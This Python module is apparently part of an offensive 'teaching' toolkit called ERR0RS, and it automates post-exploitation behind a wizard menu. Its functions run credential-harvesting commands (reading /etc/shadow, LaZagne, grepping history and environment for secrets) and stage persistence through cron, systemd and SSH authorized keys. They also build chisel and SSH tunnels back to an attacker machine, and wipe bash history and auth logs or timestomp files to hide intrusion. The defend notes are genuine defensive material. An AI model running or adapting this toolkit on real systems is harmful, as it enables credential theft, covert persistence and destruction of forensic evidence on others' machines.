#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Post-Exploitation Module
==========================================
Everything that happens AFTER you get a shell.

Phases: Situational Awareness → Persistence → Credential Harvesting
        → Pivoting → Covering Tracks

Every technique includes WHAT, WHY, and DEFEND — ERR0RS is a teaching
platform first. Tools execute second.

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import subprocess
import shutil
import os
import sys
import json
import platform
from dataclasses import dataclass, field
from typing import Optional

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..'))


# ─────────────────────────────────────────────────────────────────────
# DATA MODEL
# ─────────────────────────────────────────────────────────────────────

@dataclass
class PostExResult:
    technique: str
    command: str
    output: str = ""
    error: str = ""
    success: bool = False
    teach: str = ""
    defend: str = ""


# ─────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────

def _run(cmd: str, timeout: int = 30) -> tuple:
    """Run shell command. Returns (stdout, stderr, returncode)."""
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return proc.stdout.strip(), proc.stderr.strip(), proc.returncode
    except subprocess.TimeoutExpired:
        return "", f"[ERR0RS] Timed out after {timeout}s", 1
    except Exception as e:
        return "", f"[ERR0RS] Error: {e}", 1


def _tool_available(name: str) -> bool:
    return shutil.which(name) is not None


# ─────────────────────────────────────────────────────────────────────
# PHASE 1 — SITUATIONAL AWARENESS
# ─────────────────────────────────────────────────────────────────────

class SituationalAwareness:
    """First thing after shell: who am I, where am I, what can I reach."""

    def whoami(self) -> PostExResult:
        cmd = "whoami && id 2>/dev/null"
        out, err, rc = _run(cmd)
        return PostExResult(
            technique="Situational Awareness — Current User",
            command=cmd, output=out, error=err, success=rc == 0,
            teach=(
                "whoami reveals your shell context. 'root' on Linux = full control. "
                "'NT AUTHORITY\\SYSTEM' on Windows = full control. Anything else "
                "means you need to escalate. 'id' also shows group memberships — "
                "being in 'sudo', 'docker', or 'disk' group may be exploitable."
            ),
            defend=(
                "Monitor for whoami execution via Sysmon Event ID 1 or auditd. "
                "It is a top post-exploitation indicator. Alert on whoami being "
                "run by unexpected parent processes (IIS, Apache, SQL Server)."
            )
        )

    def sysinfo(self) -> PostExResult:
        """Gather OS version, architecture, hostname."""
        if platform.system() == "Windows":
            cmd = 'systeminfo | findstr /i "host name os name os version"'
        else:
            cmd = "uname -a && hostname && cat /etc/os-release 2>/dev/null | head -5"
        out, err, rc = _run(cmd)
        return PostExResult(
            technique="Situational Awareness — System Info",
            command=cmd, output=out, error=err, success=rc == 0,
            teach=(
                "OS version determines which local exploits apply. Architecture "
                "(x86 vs x64) affects payload selection. Hostname often reveals "
                "the host role: 'DC01' = domain controller (highest value target), "
                "'WEB01' = web server, 'DEV' = developer machine (credential gold mine)."
            ),
            defend=(
                "Systeminfo.exe execution from unexpected processes is suspicious. "
                "Sysmon + Windows Event Forwarding to SIEM catches this. "
                "Linux: auditd process tracking for uname, hostname."
            )
        )

    def network_info(self) -> PostExResult:
        """IP addresses, routes, ARP — map the internal network."""
        if platform.system() == "Windows":
            cmd = "ipconfig /all && arp -a && route print"
        else:
            cmd = "ip a 2>/dev/null || ifconfig; arp -n 2>/dev/null; ip route 2>/dev/null; cat /etc/hosts"
        out, err, rc = _run(cmd, timeout=15)
        return PostExResult(
            technique="Situational Awareness — Network Topology",
            command=cmd, output=out, error=err, success=rc == 0,
            teach=(
                "The ARP table shows every host this machine talked to recently — "
                "internal subnets invisible from the internet. Routes show which "
                "segments you can reach. /etc/hosts reveals internal hostnames "
                "not in public DNS. This entire output feeds your pivot planning."
            ),
            defend=(
                "Network segmentation limits what a compromised host can see. "
                "ARP scan patterns visible in NetFlow / Zeek logs. "
                "Zero-trust: every internal connection requires authentication."
            )
        )

    def domain_info(self) -> PostExResult:
        """Windows AD — users, groups, domain controllers."""
        if platform.system() != "Windows":
            return PostExResult(
                technique="Domain Info", command="N/A",
                output="[ERR0RS] AD enumeration is Windows-only.",
                success=False, teach="Active Directory enum requires Windows environment."
            )
        cmd = (
            'echo [Users] && net user /domain 2>nul && '
            'echo [Domain Admins] && net group "Domain Admins" /domain 2>nul && '
            'echo [DCs] && nltest /dclist:. 2>nul'
        )
        out, err, rc = _run(cmd, timeout=20)
        return PostExResult(
            technique="Situational Awareness — Active Directory",
            command=cmd, output=out, error=err, success=rc == 0,
            teach=(
                "Domain Admins = crown jewel. Compromise one DA account and "
                "you own the entire domain. DCs hold NTDS.dit — the AD database "
                "with ALL domain hashes. Map the path from your current user "
                "to DA: can you Kerberoast a service account? PTH to another host?"
            ),
            defend=(
                "Alert on net.exe /domain queries from non-admin workstations. "
                "AD Event ID 4662 logs LDAP enumeration. Implement tiered admin model. "
                "Separate DA accounts never used on workstations."
            )
        )

    def find_sensitive_files(self, search_path: str = ".") -> PostExResult:
        """Hunt for passwords, configs, keys, backups."""
        if platform.system() == "Windows":
            cmd = (
                f'dir /s /b "{search_path}\\*pass*" "{search_path}\\*cred*" '
                f'"{search_path}\\*.config" "{search_path}\\*.kdbx" 2>nul'
            )
        else:
            cmd = (
                f"find {search_path} -maxdepth 6 2>/dev/null \\( "
                "-name '*.env' -o -name '*.conf' -o -name '*.key' "
                "-o -name 'id_rsa' -o -name '*.pem' -o -name '*.kdbx' "
                "-o -name 'wp-config.php' -o -name 'database.yml' "
                "-o -name '.htpasswd' -o -name 'shadow' \\) | head -40"
            )
        out, err, rc = _run(cmd, timeout=45)
        return PostExResult(
            technique="File Recon — Sensitive File Hunt",
            command=cmd, output=out or "[ERR0RS] No matches found.", error=err, success=rc == 0,
            teach=(
                "Config files hold hardcoded creds constantly. wp-config.php = "
                "WordPress DB password. .env = app secrets (DB_PASS, API_KEY). "
                "id_rsa = SSH private key = password-free access to other hosts. "
                ".kdbx = KeePass DB. .htpasswd = web server credentials. "
                "One find here can unlock 10 more targets."
            ),
            defend=(
                "Never hardcode credentials in files. Use secrets vaults. "
                "File access auditing (auditd: -w on key files). "
                "Secret scanning in CI/CD pipelines catches this before deployment."
            )
        )

    def full_awareness_report(self) -> dict:
        results = {
            "whoami": self.whoami(),
            "sysinfo": self.sysinfo(),
            "network": self.network_info(),
            "domain": self.domain_info(),
            "sensitive_files": self.find_sensitive_files(),
        }
        return {k: {"output": v.output, "teach": v.teach, "defend": v.defend}
                for k, v in results.items()}


# ─────────────────────────────────────────────────────────────────────
# PHASE 2 — PERSISTENCE
# ─────────────────────────────────────────────────────────────────────

class PersistenceModule:
    """Survive a reboot. All methods log what they stage for cleanup."""

    def _log(self, method: str, location: str, payload: str):
        import datetime
        entry = {"ts": datetime.datetime.now().isoformat(),
                 "method": method, "location": location, "payload": payload[:80]}
        with open("/tmp/errorz_persistence.log", "a") as f:
            f.write(json.dumps(entry) + "\n")

    def cron_job(self, payload_cmd: str, interval: str = "*/5 * * * *") -> PostExResult:
        cmd = f'(crontab -l 2>/dev/null; echo "{interval} {payload_cmd}") | crontab -'
        self._log("cron", "crontab", f"{interval} {payload_cmd}")
        return PostExResult(
            technique="Persistence — Cron Job", command=cmd,
            output=f"[ERR0RS] Cron staged: {interval} {payload_cmd}",
            success=True,
            teach=(
                "*/5 * * * * = run every 5 minutes. Common use: re-call a reverse "
                "shell so if the connection drops it auto-reconnects. No reboot needed. "
                "Survives password changes. Very stealthy on unmonitored systems."
            ),
            defend=(
                "auditd: -w /var/spool/cron -p wa. Monitor crontab -e for non-root users. "
                "Alert on cron changes outside scheduled maintenance windows."
            )
        )

    def ssh_authorized_key(self, public_key: str, user: str = None) -> PostExResult:
        home = os.path.expanduser(f"~{user}" if user else "~")
        auth_keys = os.path.join(home, ".ssh", "authorized_keys")
        cmd = (
            f"mkdir -p {os.path.dirname(auth_keys)} && "
            f"chmod 700 {os.path.dirname(auth_keys)} && "
            f'echo "{public_key}" >> {auth_keys} && '
            f"chmod 600 {auth_keys}"
        )
        self._log("ssh_key", auth_keys, public_key[:40])
        return PostExResult(
            technique="Persistence — SSH Authorized Key", command=cmd,
            output=f"[ERR0RS] SSH key staged → {auth_keys}", success=True,
            teach=(
                "Adding your pubkey to authorized_keys gives password-free SSH access "
                "that survives reboots AND password changes. Extremely stealthy — "
                "authorized_keys files are rarely audited. Works even if root changes "
                "the user's password."
            ),
            defend=(
                "Monitor authorized_keys changes with inotifywait or auditd. "
                "Use SSH Certificate Authority instead of static keys. "
                "Alert on new keys added outside of change windows."
            )
        )

    def systemd_service(self, service_name: str, exec_start: str) -> PostExResult:
        unit = (
            f"[Unit]\nDescription=System Update Service\nAfter=network.target\n\n"
            f"[Service]\nType=simple\nExecStart={exec_start}\n"
            f"Restart=always\nRestartSec=30\n\n"
            f"[Install]\nWantedBy=multi-user.target\n"
        )
        unit_path = f"/etc/systemd/system/{service_name}.service"
        cmd = (
            f"cat > {unit_path} << 'EOF'\n{unit}EOF\n"
            f"systemctl daemon-reload && systemctl enable {service_name} && "
            f"systemctl start {service_name}"
        )
        self._log("systemd", unit_path, exec_start)
        return PostExResult(
            technique="Persistence — Systemd Service", command=cmd,
            output=f"[ERR0RS] Systemd service staged: {service_name}", success=True,
            teach=(
                "Restart=always auto-respawns if killed. WantedBy=multi-user.target "
                "= starts at boot. Name it 'network-helper' or 'apt-update' to blend. "
                "Requires root but gives bulletproof persistence."
            ),
            defend=(
                "Audit new .service files in /etc/systemd/system/. "
                "Alert on systemctl enable for unrecognized service names. "
                "Read-only /etc/systemd for non-root users."
            )
        )

    def cleanup_persistence(self) -> PostExResult:
        """Remove all ERR0RS-staged persistence for post-engagement cleanup."""
        log_path = "/tmp/errorz_persistence.log"
        if not os.path.exists(log_path):
            return PostExResult(technique="Cleanup", command="N/A",
                                output="[ERR0RS] No persistence log found.", success=True)
        try:
            with open(log_path) as f:
                entries = [json.loads(l) for l in f if l.strip()]
        except Exception as e:
            return PostExResult(technique="Cleanup", command="N/A",
                                output=f"[ERR0RS] Log read error: {e}", success=False)
        cmds = []
        for e in entries:
            if e["method"] == "cron":
                cmds.append("crontab -r 2>/dev/null  # REVIEW: removes all cron")
            elif e["method"] == "ssh_key":
                cmds.append(f"# Manually remove key from: {e['location']}")
            elif e["method"] == "systemd":
                svc = os.path.basename(e["location"]).replace(".service", "")
                cmds.append(f"systemctl stop {svc} && systemctl disable {svc} && rm {e['location']}")
        summary = "\n".join(cmds) if cmds else "Nothing staged."
        return PostExResult(
            technique="Persistence Cleanup", command=summary,
            output=f"[ERR0RS] {len(entries)} artifact(s) to remove:\n{summary}",
            success=True, teach="Always clean up after authorized engagements."
        )


# ─────────────────────────────────────────────────────────────────────
# PHASE 3 — CREDENTIAL HARVESTING
# ─────────────────────────────────────────────────────────────────────

class CredentialHarvesting:
    """Harvest credentials from memory, files, browsers, and the OS."""

    def lazagne_all(self) -> PostExResult:
        if _tool_available("lazagne"):
            cmd = "lazagne all"
        elif _tool_available("python3") and os.path.exists("/opt/lazagne/lazagne.py"):
            cmd = "python3 /opt/lazagne/lazagne.py all"
        else:
            cmd = "# Install: git clone https://github.com/AlessandroZ/LaZagne /opt/lazagne"
        out, err, rc = _run(cmd, timeout=60)
        return PostExResult(
            technique="Credential Harvesting — LaZagne All", command=cmd,
            output=out or "[ERR0RS] LaZagne not installed or no creds found.",
            error=err, success=(rc == 0 and bool(out)),
            teach=(
                "LaZagne dumps from: Chrome/Firefox saved passwords, Filezilla, "
                "WinSCP, Putty, SVN, Git configs, WiFi PSKs, database configs, "
                "and 60+ other sources. One run on a dev machine often yields "
                "dozens of credentials for other internal services."
            ),
            defend=(
                "EDR detects LaZagne by hash and memory behavior. "
                "Enable Windows Credential Guard. Don't store passwords in browsers "
                "on shared or admin machines. Auditd catches credential file reads."
            )
        )

    def linux_shadow_dump(self) -> PostExResult:
        cmd = "cat /etc/shadow 2>/dev/null || echo '[ERR0RS] Root required for /etc/shadow'"
        out, err, rc = _run(cmd)
        return PostExResult(
            technique="Credential Harvesting — /etc/shadow", command=cmd,
            output=out, error=err, success=bool(out) and "Root required" not in out,
            teach=(
                "/etc/shadow stores Linux hashes. Format: $6$<salt>$<hash> = SHA-512. "
                "Crack offline: hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt "
                "Only root can read it — if you can, you've already escalated. "
                "Every line = one user's hash = one lateral movement opportunity."
            ),
            defend=(
                "Permissions: 640, root:shadow. PAM lockout. Use SSH keys not passwords. "
                "auditd: -w /etc/shadow -p r -k shadow_read will log every read."
            )
        )

    def history_files(self) -> PostExResult:
        cmd = (
            "grep -hiE 'pass|pwd|token|secret|key|mysql|psql|aws|curl -u' "
            "~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null | head -30"
        )
        out, err, rc = _run(cmd)
        return PostExResult(
            technique="Credential Harvesting — Shell History", command=cmd,
            output=out or "[ERR0RS] No credential patterns in shell history.",
            error=err, success=rc == 0,
            teach=(
                "Admins and devs type passwords inline constantly: "
                "mysql -u root -pMySuperPassword123, curl -u admin:password, "
                "export AWS_SECRET=abc123, sshpass -p secretpass ssh user@host. "
                "Shell history persists until cleared. Dev/jump boxes are goldmines."
            ),
            defend=(
                "HISTFILE=/dev/null for sensitive sessions. Use --password-file flags. "
                "Rotate any credential found in history immediately. "
                "Centralized secrets management (Vault, 1Password CLI)."
            )
        )

    def env_variables(self) -> PostExResult:
        cmd = "env | grep -iE 'key|token|secret|pass|pwd|api|aws|azure|gcp|db|database|mongo|redis'"
        out, err, rc = _run(cmd)
        return PostExResult(
            technique="Credential Harvesting — Environment Variables", command=cmd,
            output=out or "[ERR0RS] No credential patterns in env variables.",
            error=err, success=rc == 0,
            teach=(
                "Apps load secrets from env vars constantly. AWS: AWS_ACCESS_KEY_ID + "
                "AWS_SECRET_ACCESS_KEY. Databases: DATABASE_PASSWORD, DB_PASS. "
                "APIs: OPENAI_API_KEY, STRIPE_SECRET_KEY, GITHUB_TOKEN. "
                "CI/CD runners and Docker containers are packed with these."
            ),
            defend=(
                "Use secrets managers: AWS Secrets Manager, HashiCorp Vault, "
                "Azure Key Vault. Never set cloud API keys in shell profiles. "
                "Docker: use Swarm secrets or Kubernetes secrets, not ENV directives."
            )
        )

    def process_memory_creds(self) -> PostExResult:
        """Check for credentials in running process memory (strings approach)."""
        cmd = (
            "ps aux 2>/dev/null | grep -iE 'pass|secret|token|key|pwd' | grep -v grep | head -20"
        )
        out, err, rc = _run(cmd)
        return PostExResult(
            technique="Credential Harvesting — Process Arguments", command=cmd,
            output=out or "[ERR0RS] No credential patterns visible in process args.",
            error=err, success=rc == 0,
            teach=(
                "Process arguments are visible to all users via 'ps aux'. "
                "Applications started with CLI credentials (--password=, -p ) "
                "expose those creds in the process list to any local user. "
                "Common on legacy database startup scripts."
            ),
            defend=(
                "Never pass passwords as command arguments. Use config files with "
                "restricted permissions or environment-based credential injection. "
                "hidepid=2 mount option on /proc hides other users' process args."
            )
        )


# ─────────────────────────────────────────────────────────────────────
# PHASE 4 — PIVOTING
# ─────────────────────────────────────────────────────────────────────

class PivotingModule:
    """Route through a compromised host to reach internal segments."""

    def ssh_local_forward(self, lport: int, rhost: str, rport: int,
                          jump_host: str, jump_user: str = "root") -> PostExResult:
        cmd = f"ssh -N -L {lport}:{rhost}:{rport} {jump_user}@{jump_host} -f"
        return PostExResult(
            technique="Pivoting — SSH Local Port Forward", command=cmd,
            output=f"[ERR0RS] localhost:{lport} → {rhost}:{rport} via {jump_host}",
            success=True,
            teach=(
                f"Tunnels {rhost}:{rport} to your local port {lport}. "
                "Example: -L 33389:10.10.10.5:3389 brings internal RDP to "
                "localhost:33389. Connect with rdesktop localhost:33389 "
                "and traffic routes through the compromised host invisibly."
            ),
            defend=(
                "-N SSH sessions (no command) are pure tunnels — alert on them. "
                "'AllowTcpForwarding no' in sshd_config blocks this. "
                "Network segmentation prevents forwarding reaching internal targets."
            )
        )

    def ssh_dynamic_socks(self, lport: int, jump_host: str,
                          jump_user: str = "root") -> PostExResult:
        cmd = f"ssh -N -D {lport} {jump_user}@{jump_host} -f"
        return PostExResult(
            technique="Pivoting — SSH Dynamic SOCKS5 Proxy", command=cmd,
            output=(
                f"[ERR0RS] SOCKS5 proxy: localhost:{lport} via {jump_host}\n"
                f"Configure proxychains.conf: socks5 127.0.0.1 {lport}\n"
                f"Then: proxychains nmap <internal_ip>"
            ),
            success=True,
            teach=(
                f"Creates SOCKS5 proxy on localhost:{lport}. With proxychains, "
                "route ANY tool through the compromised host: nmap, hydra, "
                "metasploit, sqlmap — all traffic appears to originate from "
                "inside the internal network. The most powerful pivot technique."
            ),
            defend=(
                "AllowTcpForwarding no + AllowStreamLocalForwarding no. "
                "Block unusual outbound SSH from internal servers. "
                "Monitor for -D flag SSH sessions in connection logs."
            )
        )

    def chisel_server_cmd(self, port: int = 8080) -> PostExResult:
        cmd = f"./chisel server -p {port} --reverse --socks5"
        return PostExResult(
            technique="Pivoting — Chisel Reverse Tunnel (Attacker Server)", command=cmd,
            output=(
                f"[ERR0RS] Run on YOUR machine:\n  {cmd}\n\n"
                f"Then run chisel client on the compromised host."
            ),
            success=True,
            teach=(
                "Chisel creates encrypted tunnels when SSH is blocked. "
                "--reverse lets clients expose internal ports back to you. "
                "--socks5 adds a SOCKS proxy. Works through most firewalls "
                "because it looks like HTTPS traffic."
            ),
            defend=(
                "Application allowlisting blocks chisel binary execution. "
                "Egress filtering stops the outbound connection. "
                "SSL inspection can identify chisel protocol signatures."
            )
        )

    def chisel_client_cmd(self, server_ip: str, server_port: int,
                          remote_host: str, remote_port: int, local_port: int) -> PostExResult:
        cmd = f"./chisel client {server_ip}:{server_port} R:{local_port}:{remote_host}:{remote_port}"
        return PostExResult(
            technique="Pivoting — Chisel Reverse Tunnel (Target Client)", command=cmd,
            output=(
                f"[ERR0RS] Run on COMPROMISED host:\n  {cmd}\n"
                f"Exposes {remote_host}:{remote_port} on attacker localhost:{local_port}"
            ),
            success=True,
            teach=(
                "Client connects OUT from the target (bypasses inbound firewall). "
                f"After running: localhost:{local_port} on your machine reaches "
                f"{remote_host}:{remote_port} inside the internal network."
            ),
            defend="Egress filtering, application allowlisting, EDR behavioral detection."
        )

    def meterpreter_portfwd(self, lport: int, rhost: str, rport: int) -> PostExResult:
        cmd = f"portfwd add -l {lport} -r {rhost} -p {rport}"
        return PostExResult(
            technique="Pivoting — Meterpreter Port Forward", command=cmd,
            output=(
                f"[ERR0RS] Run inside meterpreter session:\n  {cmd}\n"
                f"Then: connect to localhost:{lport} to reach {rhost}:{rport}"
            ),
            success=True,
            teach=(
                "Meterpreter's portfwd routes traffic through an established "
                "session without needing SSH. Once Meterpreter is running, "
                f"portfwd brings {rhost}:{rport} to your local port {lport}. "
                "Chain multiple sessions to pivot deep into segmented networks."
            ),
            defend=(
                "EDR detects Meterpreter session patterns and process injection. "
                "Network segmentation limits what Meterpreter can reach even when running. "
                "Kill Meterpreter: portfwd routes stop instantly."
            )
        )


# ─────────────────────────────────────────────────────────────────────
# PHASE 5 — COVERING TRACKS
# ─────────────────────────────────────────────────────────────────────

class CoveringTracks:
    """Document what you clear so the report shows exactly what to verify."""

    def clear_bash_history(self) -> PostExResult:
        cmd = "history -c && unset HISTFILE && truncate -s 0 ~/.bash_history 2>/dev/null"
        return PostExResult(
            technique="Covering Tracks — Bash History Clear", command=cmd,
            output="[ERR0RS] Bash history clear staged.",
            success=True,
            teach=(
                "history -c clears in-memory history. HISTFILE=/dev/null stops "
                "new writes. Truncating the file removes disk evidence. "
                "BUT: syslog and auditd already captured commands before this ran. "
                "Clearing local logs only helps when defenders rely on local files."
            ),
            defend=(
                "Ship auth logs to SIEM in real-time. Auditd captures before history. "
                "Alert on: truncate/cat /dev/null applied to .bash_history, "
                "history -c executed, HISTFILE=/dev/null in env."
            )
        )

    def clear_auth_log(self) -> PostExResult:
        cmd = "truncate -s 0 /var/log/auth.log 2>/dev/null && truncate -s 0 /var/log/secure 2>/dev/null"
        return PostExResult(
            technique="Covering Tracks — Auth Log Clear", command=cmd,
            output="[ERR0RS] Auth log clear staged (requires root).",
            success=True,
            teach=(
                "/var/log/auth.log = SSH logins, sudo, PAM events. "
                "Clearing removes evidence of initial access and escalation. "
                "In enterprise: SIEM already has this data shipped in real-time. "
                "Clearing the local file is only effective against local forensics."
            ),
            defend=(
                "Forward all auth logs to immutable remote SIEM. "
                "Alert on: write access to /var/log/auth.log. "
                "chattr +i /var/log/auth.log makes it immutable even for root."
            )
        )

    def timestomp(self, filepath: str, reference_file: str = "/etc/passwd") -> PostExResult:
        cmd = f"touch -r {reference_file} {filepath}"
        return PostExResult(
            technique="Covering Tracks — Timestomping", command=cmd,
            output=f"[ERR0RS] Timestomp: {filepath} timestamps → match {reference_file}",
            success=True,
            teach=(
                "Copies timestamps from reference_file to your planted file. "
                "A backdoor dropped today on a 2019 system would stick out — "
                "timestomping makes it look like it's been there since 2019. "
                "Forensic note: ctime (inode change time) cannot be faked on Linux."
            ),
            defend=(
                "FIM (file integrity monitoring) tracks hash AND timestamps. "
                "AIDE, Tripwire: catch hash changes even when timestamps match. "
                "ctime is reliable for forensics. Baseline all critical files."
            )
        )


# ─────────────────────────────────────────────────────────────────────
# MASTER CONTROLLER
# ─────────────────────────────────────────────────────────────────────

class PostExController:
    """Single entry point. Errorz_launcher and smart wizard call this."""

    def __init__(self):
        self.awareness   = SituationalAwareness()
        self.persistence = PersistenceModule()
        self.creds       = CredentialHarvesting()
        self.pivoting    = PivotingModule()
        self.tracks      = CoveringTracks()

    def run(self, action: str, params: dict = None) -> PostExResult:
        params = params or {}
        a = action.strip().lower()

        dispatch = {
            "whoami":          lambda: self.awareness.whoami(),
            "sysinfo":         lambda: self.awareness.sysinfo(),
            "network":         lambda: self.awareness.network_info(),
            "domain":          lambda: self.awareness.domain_info(),
            "sensitive_files": lambda: self.awareness.find_sensitive_files(params.get("path", ".")),
            "full_report":     lambda: PostExResult("Full Awareness Report", "multiple",
                                        output=json.dumps(self.awareness.full_awareness_report(), indent=2),
                                        success=True),
            "lazagne":         lambda: self.creds.lazagne_all(),
            "shadow":          lambda: self.creds.linux_shadow_dump(),
            "history":         lambda: self.creds.history_files(),
            "env_creds":       lambda: self.creds.env_variables(),
            "proc_creds":      lambda: self.creds.process_memory_creds(),
            "cron":            lambda: self.persistence.cron_job(params.get("payload","id"), params.get("interval","*/5 * * * *")),
            "ssh_key":         lambda: self.persistence.ssh_authorized_key(params.get("pubkey",""), params.get("user")),
            "systemd":         lambda: self.persistence.systemd_service(params.get("name","updater"), params.get("exec","/bin/bash -i")),
            "cleanup":         lambda: self.persistence.cleanup_persistence(),
            "socks":           lambda: self.pivoting.ssh_dynamic_socks(params.get("port",1080), params.get("host",""), params.get("user","root")),
            "ssh_forward":     lambda: self.pivoting.ssh_local_forward(params.get("lport",3389), params.get("rhost",""), params.get("rport",3389), params.get("jump",""), params.get("user","root")),
            "chisel_server":   lambda: self.pivoting.chisel_server_cmd(params.get("port",8080)),
            "chisel_client":   lambda: self.pivoting.chisel_client_cmd(params.get("server",""), params.get("sport",8080), params.get("rhost",""), params.get("rport",80), params.get("lport",8080)),
            "portfwd":         lambda: self.pivoting.meterpreter_portfwd(params.get("lport",3389), params.get("rhost",""), params.get("rport",3389)),
            "clear_history":   lambda: self.tracks.clear_bash_history(),
            "clear_auth":      lambda: self.tracks.clear_auth_log(),
            "timestomp":       lambda: self.tracks.timestomp(params.get("file",""), params.get("ref","/etc/passwd")),
        }

        if a in dispatch:
            return dispatch[a]()

        valid = ", ".join(dispatch.keys())
        return PostExResult("Unknown", action,
                            output=f"[ERR0RS] Unknown post-ex action '{action}'. Valid: {valid}",
                            success=False)


# ─────────────────────────────────────────────────────────────────────
# WIZARD MENU
# ─────────────────────────────────────────────────────────────────────

POSTEX_WIZARD_MENU = {
    "title": "ERR0RS // POST-EXPLOITATION WIZARD",
    "options": [
        {"key": "1",  "label": "Full Situational Awareness Report",     "action": "full_report"},
        {"key": "2",  "label": "Who Am I? (whoami + id)",               "action": "whoami"},
        {"key": "3",  "label": "System Info (OS, arch, hostname)",      "action": "sysinfo"},
        {"key": "4",  "label": "Network Map (IPs, ARP, routes)",        "action": "network"},
        {"key": "5",  "label": "Active Directory Enum (Windows/AD)",    "action": "domain"},
        {"key": "6",  "label": "Hunt Sensitive Files (.env, keys, DBs)","action": "sensitive_files"},
        {"key": "7",  "label": "Credential Harvest — LaZagne All",      "action": "lazagne"},
        {"key": "8",  "label": "Credential Harvest — /etc/shadow",      "action": "shadow"},
        {"key": "9",  "label": "Credential Harvest — Shell History",    "action": "history"},
        {"key": "10", "label": "Credential Harvest — Env Variables",    "action": "env_creds"},
        {"key": "11", "label": "Credential Harvest — Process Args",     "action": "proc_creds"},
        {"key": "12", "label": "Persistence — Cron Job (Linux)",        "action": "cron"},
        {"key": "13", "label": "Persistence — SSH Authorized Key",      "action": "ssh_key"},
        {"key": "14", "label": "Persistence — Systemd Service",         "action": "systemd"},
        {"key": "15", "label": "Pivot — SSH SOCKS5 Proxy",              "action": "socks"},
        {"key": "16", "label": "Pivot — SSH Local Port Forward",        "action": "ssh_forward"},
        {"key": "17", "label": "Pivot — Chisel Server (your machine)",  "action": "chisel_server"},
        {"key": "18", "label": "Pivot — Chisel Client (target)",        "action": "chisel_client"},
        {"key": "19", "label": "Pivot — Meterpreter portfwd",           "action": "portfwd"},
        {"key": "20", "label": "Cover Tracks — Clear Bash History",     "action": "clear_history"},
        {"key": "21", "label": "Cover Tracks — Clear Auth Log",         "action": "clear_auth"},
        {"key": "22", "label": "Cover Tracks — Timestomp File",         "action": "timestomp"},
        {"key": "23", "label": "Cleanup — Remove All ERR0RS Artifacts", "action": "cleanup"},
    ]
}

if __name__ == "__main__":
    ctrl = PostExController()
    print("[ERR0RS] Post-Exploitation Module OK")
    r = ctrl.run("whoami")
    print(f"Technique : {r.technique}")
    print(f"Command   : {r.command}")
    print(f"Output    : {r.output}")
    print(f"\n[TEACH]  {r.teach}")
    print(f"[DEFEND] {r.defend}")
